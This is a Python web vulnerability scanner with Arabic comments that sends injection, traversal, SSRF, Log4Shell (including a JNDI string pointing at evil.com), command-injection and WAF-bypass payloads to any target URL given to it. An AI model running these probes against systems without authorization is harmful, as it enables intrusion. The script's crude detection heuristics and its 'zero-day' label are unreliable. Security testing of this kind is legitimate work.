#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
أداة فحص الثغرات اليوم الصفري (Zero-Day) المتقدمة
Advanced Zero-Day Vulnerability Scanner

هذه الأداة مصممة للكشف عن الثغرات اليوم الصفري من خلال تحليل الأنماط غير المعتادة
والمؤشرات السلوكية التي قد تشير إلى وجود ثغرات غير معروفة بعد.
"""

import requests
import json
import time
import re
import socket
import ssl
import subprocess
import sys
import os
import threading
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib.parse import urlparse, urljoin
import warnings

# تعطيل التحذيرات الأمنية
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")

class ZeroDayScanner:
    def __init__(self):
        self.results = []
        self.lock = threading.Lock()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'ZeroDay-Scanner/1.0 (Security Research)'
        })
        
    def print_banner(self):
        banner = """
╔═══════════════════════════════════════════════════════════════╗
║                أداة فحص الثغرات اليوم الصفري                  ║
║                 Zero-Day Vulnerability Scanner                  ║
║                                                               ║
║     الكشف عن الثغرات غير المعروفة والاستغلالات المشبوهة     ║
╚═══════════════════════════════════════════════════════════════╝
        """
        print(banner)
        
    def add_finding(self, target, vulnerability_type, risk_level, description, evidence=None):
        finding = {
            "target": target,
            "vulnerability_type": vulnerability_type,
            "risk_level": risk_level,
            "description": description,
            "evidence": evidence,
            "timestamp": datetime.now().isoformat()
        }
        
        with self.lock:
            self.results.append(finding)
            self.print_finding(finding)
    
    def print_finding(self, finding):
        colors = {
            "CRITICAL": "\033[91m",
            "HIGH": "\033[93m",
            "MEDIUM": "\033[94m",
            "LOW": "\033[92m",
            "INFO": "\033[96m"
        }
        
        color = colors.get(finding["risk_level"], "")
        reset = "\033[0m"
        
        print(f"{color}[{finding['risk_level']}] {finding['vulnerability_type']} - {finding['target']}{reset}")
        print(f"الوصف: {finding['description']}")
        if finding.get("evidence"):
            print(f"الدليل: {finding['evidence']}")
        print("-" * 60)
    
    def check_unusual_headers(self, target):
        """التحقق من رؤوس غير معتادة قد تشير إلى ثغرات"""
        try:
            response = self.session.get(target, timeout=10, verify=False)
            unusual_headers = []
            
            # رؤوس مشبوهة قد تشير إلى ثغرات
            suspicious_headers = [
                'X-Powered-By', 'Server', 'X-AspNet-Version', 'X-Generator',
                'X-Drupal-Cache', 'X-Mod-Pagespeed', 'X-OWA-Version',
                'X-SharePointHealthScore', 'X-XSS-Protection'
            ]
            
            for header in suspicious_headers:
                if header in response.headers:
                    value = response.headers[header]
                    # التحقق من إصدارات قديمة أو مشبوهة
                    if re.search(r'\d+\.\d+\.\d+', value):
                        version = re.search(r'(\d+\.\d+\.\d+)', value).group(1)
                        major, minor, patch = map(int, version.split('.'))
                        
                        # إشارات على إصدارات قديمة محتملة
                        if major < 10 and (header == 'X-Powered-By' and 'PHP' in value):
                            self.add_finding(
                                target, "نسخة PHP قديمة محتملة", "HIGH",
                                f"تم اكتشاف نسخة PHP قديمة: {value} قد تحتوي على ثغرات يوم صفري",
                                f"Header: {header}: {value}"
                            )
                        elif 'Exchange' in value and major < 15:
                            self.add_finding(
                                target, "Microsoft Exchange قديم", "CRITICAL",
                                "تم اكتشاف Microsoft Exchange قديم محتمل وجود ثغرات يوم صفري",
                                f"Header: {header}: {value}"
                            )
                            
        except Exception as e:
            pass
    
    def check_error_based_detection(self, target):
        """الكشف عن معلومات حساسة في رسائل الخطأ"""
        payloads = [
            "../../../etc/passwd",
            "' OR 1=1--",
            "<script>alert('xss')</script>",
            "../../../../windows/system32/drivers/etc/hosts",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "#{7*7}",
            "${7*7}"
        ]
        
        for payload in payloads:
            try:
                test_url = f"{target.rstrip('/')}/?test={payload}"
                response = self.session.get(test_url, timeout=8, verify=False)
                
                # أنماط مشبوهة في الاستجابة
                suspicious_patterns = [
                    r'root:.*?:0:0:',
                    r'Administrator',
                    r'javax\.naming\.CommunicationException',
                    r'Expression\s+evaluated\s+to',
                    r'Template\s+processing\s+error',
                    r'SQL\s+syntax\s+error',
                    r'ORA-\d+',
                    r'MySQL\s+error',
                    r'PostgreSQL\s+error'
                ]
                
                for pattern in suspicious_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        self.add_finding(
                            target, "كشف معلومات حساسة", "HIGH",
                            "تم اكتشاف معلومات حساسة في رسائل الخطأ قد تشير إلى ثغرات",
                            f"Payload: {payload} - Pattern: {pattern}"
                        )
                        break
                        
            except Exception:
                continue
    
    def check_timing_based_detection(self, target):
        """الكشف عن الثغرات بناءً على وقت الاستجابة"""
        timing_payloads = [
            ("sleep(5)", 5),
            ("sleep(10)", 10),
            ("WAITFOR DELAY '0:0:5'", 5),
            ("pg_sleep(5)", 5)
        ]
        
        for payload, expected_delay in timing_payloads:
            try:
                start_time = time.time()
                test_url = f"{target.rstrip('/')}/?sleep={payload}"
                response = self.session.get(test_url, timeout=15, verify=False)
                actual_delay = time.time() - start_time
                
                if abs(actual_delay - expected_delay) < 1:
                    self.add_finding(
                        target, "ثغرة SQL Injection زمنية", "CRITICAL",
                        "تم اكتشاف ثغرة SQL Injection زمنية محتملة",
                        f"Payload: {payload} - Delay: {actual_delay}s"
                    )
                    
            except Exception:
                continue
    
    def check_log4j_vulnerability(self, target):
        """الكشف عن ثغرات Log4j (Log4Shell)"""
        jndi_payloads = [
            "${jndi:ldap://127.0.0.1:1389/a}",
            "${jndi:rmi://127.0.0.1:1099/a}",
            "${jndi:dns://127.0.0.1/a}",
            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1:1389/a}"
        ]
        
        headers_to_test = [
            'User-Agent', 'X-Forwarded-For', 'X-Real-IP', 'X-Originating-IP',
            'X-Remote-IP', 'X-Remote-Addr', 'X-Client-IP', 'CF-Connecting-IP',
            'True-Client-IP', 'X-Forwarded-Host', 'X-Host', 'Forwarded'
        ]
        
        for payload in jndi_payloads:
            for header in headers_to_test:
                try:
                    headers = {header: payload}
                    response = self.session.get(target, headers=headers, timeout=10, verify=False)
                    
                    # التحقق من علامات الاستغلال في الاستجابة
                    if any(keyword in response.text.lower() for keyword in ['jndi', 'ldap', 'rmi']):
                        self.add_finding(
                            target, "ثغرة Log4Shell (CVE-2021-44228)", "CRITICAL",
                            "تم اكتشاف ثغرة Log4Shell النقدية",
                            f"Header: {header} - Payload: {payload}"
                        )
                        
                except Exception:
                    continue
    
    def check_ssrf_vulnerability(self, target):
        """الكشف عن ثغرات SSRF"""
        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://localhost:22",
            "http://127.0.0.1:3306",
            "file:///etc/passwd",
            "file:///windows/system32/drivers/etc/hosts"
        ]
        
        for payload in ssrf_payloads:
            try:
                test_url = f"{target.rstrip('/')}/?url={payload}"
                response = self.session.get(test_url, timeout=10, verify=False)
                
                # علامات SSRF ناجحة
                success_indicators = [
                    'ami-id', 'instance-id', 'public-hostname',  # AWS
                    'computeMetadata', 'project-id',             # GCP
                    'root:', 'Administrator',                      # Local files
                    'SSH-', 'mysql', 'PostgreSQL'                  # Services
                ]
                
                for indicator in success_indicators:
                    if indicator in response.text:
                        self.add_finding(
                            target, "ثغرة SSRF", "HIGH",
                            "تم اكتشاف ثغرة SSRF محتملة",
                            f"Payload: {payload} - Indicator: {indicator}"
                        )
                        break
                        
            except Exception:
                continue
    
    def check_deserialization_vulnerability(self, target):
        """الكشف عن ثغرات التسلسل/فك التسلسل"""
        deserialization_payloads = [
            # Java
            'rO0AB',
            # PHP
            'O:8:"stdClass":0:{}',
            # Python
            'gANj',
            # Ruby
            'BAhb'
        ]
        
        for payload in deserialization_payloads:
            try:
                headers = {'Content-Type': 'application/octet-stream'}
                response = self.session.post(
                    target, 
                    data=payload, 
                    headers=headers, 
                    timeout=10, 
                    verify=False
                )
                
                # علامات فك التسلسل غير الآمن
                error_signs = [
                    'java.io.ObjectInputStream',
                    'unserialize',
                    'pickle',
                    'marshal',
                    'yaml.load',
                    'ObjectInputStream.readObject'
                ]
                
                for sign in error_signs:
                    if sign in response.text:
                        self.add_finding(
                            target, "ثغرة فك التسلسل", "CRITICAL",
                            "تم اكتشاف ثغرة فك تسلسل غير آمن",
                            f"Payload type: {payload[:20]}... - Error: {sign}"
                        )
                        break
                        
            except Exception:
                continue
    
    def check_rce_vulnerability(self, target):
        """الكشف عن ثغرات تنفيذ الأوامر البعيدة"""
        rce_payloads = [
            # Linux
            '$(sleep 5)',
            '`sleep 5`',
            ';sleep 5',
            '|sleep 5',
            # Windows
            '&ping -n 5 127.0.0.1',
            '|ping -n 5 127.0.0.1',
            # Generic
            '{{7*7}}',
            '#{7*7}',
            '${7*7}'
        ]
        
        for payload in rce_payloads:
            try:
                start_time = time.time()
                test_url = f"{target.rstrip('/')}/?cmd={payload}"
                response = self.session.get(test_url, timeout=15, verify=False)
                elapsed = time.time() - start_time
                
                # التحقق من تنفيذ الأمر
                if '49' in response.text or elapsed > 4:
                    self.add_finding(
                        target, "ثغرة RCE", "CRITICAL",
                        "تم اكتشاف ثغرة تنفيذ أوامر بعيدة محتملة",
                        f"Payload: {payload} - Response time: {elapsed}s"
                    )
                    
            except Exception:
                continue
    
    def check_waf_bypass(self, target):
        """التحقق من إمكانية تجاوز جدار الحماية"""
        bypass_payloads = [
            # SQL Injection bypasses
            "'/**/OR/**/1=1#",
            "'/*!50000OR*/1=1#",
            "' OR 1=1-- -",
            # XSS bypasses
            "<scriPt>alert(1)</scriPt>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            # Command injection bypasses
            "%3Bcat%20/etc/passwd",
            "%0Acat%20/etc/passwd",
            "cat$IFS/etc/passwd"
        ]
        
        for payload in bypass_payloads:
            try:
                test_url = f"{target.rstrip('/')}/?input={payload}"
                response = self.session.get(test_url, timeout=10, verify=False)
                
                # علامات نجاح التجاوز
                success_patterns = [
                    'mysql_fetch_array',
                    'ORA-',
                    'PostgreSQL query',
                    '<script>alert',
                    'root:x:0:0'
                ]
                
                for pattern in success_patterns:
                    if pattern in response.text:
                        self.add_finding(
                            target, "إمكانية تجاوز WAF", "HIGH",
                            "تم اكتشاف إمكانية تجاوز جدار الحماية",
                            f"Payload: {payload} - Pattern: {pattern}"
                        )
                        break
                        
            except Exception:
                continue
    
    def scan_target(self, target):
        """فحص الهدف للكشف عن الثغرات اليوم الصفري"""
        print(f"\n[+] بدء فحص الهدف: {target}")
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        # قائمة وظائف الفحص
        scan_functions = [
            self.check_unusual_headers,
            self.check_error_based_detection,
            self.check_timing_based_detection,
            self.check_log4j_vulnerability,
            self.check_ssrf_vulnerability,
            self.check_deserialization_vulnerability,
            self.check_rce_vulnerability,
            self.check_waf_bypass
        ]
        
        # تشغيل جميع وظائف الفحص
        for scan_func in scan_functions:
            try:
                scan_func(target)
            except Exception as e:
                print(f"خطأ في {scan_func.__name__}: {str(e)}")
                continue
    
    def save_results(self, filename=None):
        """حفظ النتائج في ملف JSON"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"zero_day_scan_{timestamp}.json"
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, ensure_ascii=False, indent=2)
        
        print(f"\n[+] تم حفظ النتائج في: {filename}")
        return filename
    
    def generate_report(self):
        """توليد تقرير مختصر"""
        if not self.results:
            print("\n[+] لم يتم اكتشاف أي ثغرات محتملة.")
            return
        
        critical = sum(1 for r in self.results if r['risk_level'] == 'CRITICAL')
        high = sum(1 for r in self.results if r['risk_level'] == 'HIGH')
        medium = sum(1 for r in self.results if r['risk_level'] == 'MEDIUM')
        low = sum(1 for r in self.results if r['risk_level'] == 'LOW')
        
        print("\n" + "="*60)
        print("                    ملخص النتائج")
        print("="*60)
        print(f"الثغرات الحرجة (CRITICAL): {critical}")
        print(f"الثغرات عالية الخطورة (HIGH): {high}")
        print(f"الثغرات متوسطة الخطورة (MEDIUM): {medium}")
        print(f"الثغرات منخفضة الخطورة (LOW): {low}")
        print(f"إجمالي الثغرات: {len(self.results)}")
        print("="*60)

def main():
    scanner = ZeroDayScanner()
    scanner.print_banner()
    
    if len(sys.argv) < 2:
        print("الاستخدام: python zero-day-scanner.py <URL أو IP>")
        print("مثال: python zero-day-scanner.py http://example.com")
        print("مثال: python zero-day-scanner.py 192.168.1.100")
        sys.exit(1)
    
    targets = sys.argv[1:]
    
    for target in targets:
        scanner.scan_target(target)
    
    scanner.generate_report()
    
    # حفظ النتائج
    filename = scanner.save_results()
    
    print("\n[+] اكتمل الفحص بنجاح!")
    print("[⚠️]  ملاحظة: هذه الأداة للكشف عن المؤشرات المحتملة فقط")
    print("[⚠️]  يجب التحقق اليدوي من النتائج قبل اتخاذ أي إجراء")

if __name__ == "__main__":
    main()